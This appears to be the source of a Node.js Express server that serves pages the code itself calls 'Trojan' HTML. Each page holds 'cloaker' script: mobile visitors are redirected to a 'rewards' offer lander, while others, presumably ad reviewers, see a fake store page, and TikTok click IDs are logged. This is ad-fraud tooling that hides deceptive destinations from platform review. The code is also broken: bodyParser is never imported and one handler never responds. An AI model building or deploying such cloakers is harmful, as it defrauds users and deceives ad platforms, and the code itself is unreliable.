const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const { Client } = require('pg');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));
// Use bodyParser middleware to parse JSON request bodies
app.use(bodyParser.json());

// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://rewards-for-all.com/${offer}.html`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to our Store!</h1>
            <p>You are shopping at: ${slug}</p>
            <script>
                function sendPostRequest() {
                    const urlParams = new URLSearchParams(window.location.search);
                    const ttclid = urlParams.get('ttclid');
                    const botView = true;
                    const postData = {
                        ttclid: ttclid,
                        botView: botView
                    };
                    fetch('/response', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(postData)
                    })
                };
                sendPostRequest();
            </script>
        </body>
        </html>
    `;
    res.send(trojanHTML);
    console.log(`Served ${offer} Trojan (${slug})`);
});

// Middleware to receive and log analytics
app.post('/response', (req, res) => {
    // Extract data from the request body
    const responseData = req.body;

    // Process the received data as needed
    console.log('Received response:', responseData);

});

// Start the HTTP server
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// Read DB password
const dbPassword = process.env.DATABASE_PW;

// Create PostgreSQL client
const client = new Client({
  host: 'app-25787a0a-b9f7-4567-a04b-7b383f161891-do-user-15644970-0.c.db.ondigitalocean.com',
  port: 25060,
  user: 'db',
  password: dbPassword,
  database: 'db'
});

// Connect to the PostgreSQL database
client.connect((err) => {
  if (err) {
    console.error('Error connecting to PostgreSQL database:', err);
    return;
  }
  console.log('Connected to PostgreSQL database');
});
